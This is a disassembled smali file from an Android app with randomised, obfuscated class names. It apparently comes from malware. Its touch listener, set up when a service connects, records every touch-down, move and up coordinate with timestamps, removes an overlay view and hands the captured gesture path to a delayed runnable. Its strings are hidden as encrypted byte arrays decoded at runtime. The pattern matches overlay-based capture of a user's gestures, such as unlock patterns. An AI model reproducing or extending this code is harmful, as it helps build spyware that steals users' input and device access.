.class Lcom/vknnolqo/p9sv5zvf/SM099EXd$l;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Landroid/view/View$OnTouchListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/vknnolqo/p9sv5zvf/SM099EXd;->onServiceConnected()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic b:Lcom/vknnolqo/p9sv5zvf/SM099EXd;


# direct methods
.method constructor <init>(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V
    .locals 0

    iput-object p1, p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd$l;->b:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onTouch(Landroid/view/View;Landroid/view/MotionEvent;)Z
    .locals 4

    const/4 p1, 0x0

    :try_start_0
    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/SM099EXd$l;->b:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->h(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)Z

    move-result v0

    if-nez v0, :cond_0

    const/4 p2, 0x4

    new-array p2, p2, [B

    fill-array-data p2, :array_0

    const/16 v0, 0x8

    new-array v0, v0, [B

    fill-array-data v0, :array_1

    invoke-static {p2, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p2

    const-string v0, ""

    invoke-static {p2, v0}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->p(Ljava/lang/String;Ljava/lang/String;)V

    return p1

    :catch_0
    move-exception p2

    goto/16 :goto_1

    :cond_0
    invoke-virtual {p2}, Landroid/view/MotionEvent;->getX()F

    move-result v0

    float-to-int v0, v0

    invoke-virtual {p2}, Landroid/view/MotionEvent;->getY()F

    move-result v1

    float-to-int v1, v1

    invoke-virtual {p2}, Landroid/view/MotionEvent;->getAction()I

    move-result v2

    if-eqz v2, :cond_4

    const/4 v3, 0x1

    if-eq v2, v3, :cond_2

    const/4 p2, 0x2

    if-eq v2, p2, :cond_1

    goto/16 :goto_2

    :cond_1
    sget-object p2, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->u:Ljava/util/List;

    new-instance v2, Landroid/graphics/Point;

    invoke-direct {v2, v0, v1}, Landroid/graphics/Point;-><init>(II)V

    :goto_0
    invoke-interface {p2, v2}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_2

    :cond_2
    invoke-virtual {p2}, Landroid/view/MotionEvent;->getX()F

    move-result v2

    float-to-int v2, v2

    sput v2, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->B:I

    invoke-virtual {p2}, Landroid/view/MotionEvent;->getY()F

    move-result p2

    float-to-int p2, p2

    sput p2, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->C:I

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    long-to-float p2, v2

    sput p2, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->D:F

    sget-object p2, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->u:Ljava/util/List;

    new-instance v2, Landroid/graphics/Point;

    invoke-direct {v2, v0, v1}, Landroid/graphics/Point;-><init>(II)V

    invoke-interface {p2, v2}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    sget-object p2, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->u:Ljava/util/List;

    invoke-interface {p2}, Ljava/util/List;->toArray()[Ljava/lang/Object;

    move-result-object v0

    array-length v0, v0

    new-array v0, v0, [Landroid/graphics/Point;

    invoke-interface {p2, v0}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object p2

    check-cast p2, [Landroid/graphics/Point;

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->s:Landroid/view/View;

    invoke-virtual {v0}, Landroid/view/View;->getWindowToken()Landroid/os/IBinder;

    move-result-object v0

    if-eqz v0, :cond_3

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->t:Landroid/view/WindowManager;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->s:Landroid/view/View;

    invoke-interface {v0, v1}, Landroid/view/ViewManager;->removeView(Landroid/view/View;)V

    :cond_3
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd$l$a;

    invoke-direct {v1, p0, p2}, Lcom/vknnolqo/p9sv5zvf/SM099EXd$l$a;-><init>(Lcom/vknnolqo/p9sv5zvf/SM099EXd$l;[Landroid/graphics/Point;)V

    const-wide/16 v2, 0x1

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    sget-object p2, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->u:Ljava/util/List;

    invoke-interface {p2}, Ljava/util/List;->clear()V

    goto :goto_2

    :cond_4
    invoke-virtual {p2}, Landroid/view/MotionEvent;->getX()F

    move-result v2

    float-to-int v2, v2

    sput v2, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->y:I

    invoke-virtual {p2}, Landroid/view/MotionEvent;->getY()F

    move-result p2

    float-to-int p2, p2

    sput p2, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->z:I

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    long-to-float p2, v2

    sput p2, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->A:F

    sget-object p2, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->u:Ljava/util/List;

    new-instance v2, Landroid/graphics/Point;

    invoke-direct {v2, v0, v1}, Landroid/graphics/Point;-><init>(II)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :goto_1
    invoke-virtual {p2}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_2
    return p1

    nop

    :array_0
    .array-data 1
        0xet
        -0x5t
        -0x50t
        -0x77t
    .end array-data

    :array_1
    .array-data 1
        0x5dt
        -0x71t
        -0x21t
        -0x7t
        0x65t
        0x39t
        -0x9t
        0x4ct
    .end array-data
.end method
